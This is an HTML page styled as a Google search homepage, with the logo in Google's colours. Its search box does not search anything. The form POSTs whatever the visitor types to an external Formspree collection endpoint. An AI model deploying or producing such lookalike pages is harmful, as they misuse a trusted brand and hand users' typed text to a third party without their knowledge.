<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Search</title>
<style>
  * { box-sizing: border-box; }
  body {
    font-family: Arial, sans-serif;
    height: 100vh;
    margin: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: #fff;
  }
  .logo {
    font-size: 64px;
    font-weight: 600;
    margin-bottom: 30px;
    letter-spacing: 2px;
  }
  .logo span:nth-child(1) { color: #4285F4; }
  .logo span:nth-child(2) { color: #EA4335; }
  .logo span:nth-child(3) { color: #FBBC05; }
  .logo span:nth-child(4) { color: #4285F4; }
  .logo span:nth-child(5) { color: #34A853; }
  .logo span:nth-child(6) { color: #EA4335; }

  form {
    display: flex;
    align-items: center;
    width: 90%;
    max-width: 580px;
    border: 1px solid #dfe1e5;
    border-radius: 24px;
    padding: 10px 20px;
    box-shadow: 0 1px 6px rgba(32,33,36,.28);
  }
  form:hover { box-shadow: 0 1px 10px rgba(32,33,36,.35); }

  input[type="text"] {
    flex: 1;
    border: none;
    outline: none;
    font-size: 16px;
    padding: 6px 8px;
  }

  button {
    background: #4285F4;
    color: #fff;
    border: none;
    border-radius: 18px;
    padding: 8px 18px;
    font-size: 14px;
    cursor: pointer;
  }
  button:hover { background: #3367d6; }

  .msg {
    margin-top: 20px;
    font-size: 14px;
    color: #34A853;
  }
</style>
</head>
<body>

  <div class="logo">
    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
  </div>

  <!-- 🔧 Replace YOUR_FORM_ID below with your actual Formspree form ID -->
  <form action="https://formspree.io/f/mnpnqpzy" method="POST">
    <input type="text" name="query" placeholder="Search or type something" required autofocus>
    <button type="submit">Search</button>
  </form>

  <p class="msg" id="thankyou" style="display:none;">Thanks! Your text was sent.</p>

</body>
</html>
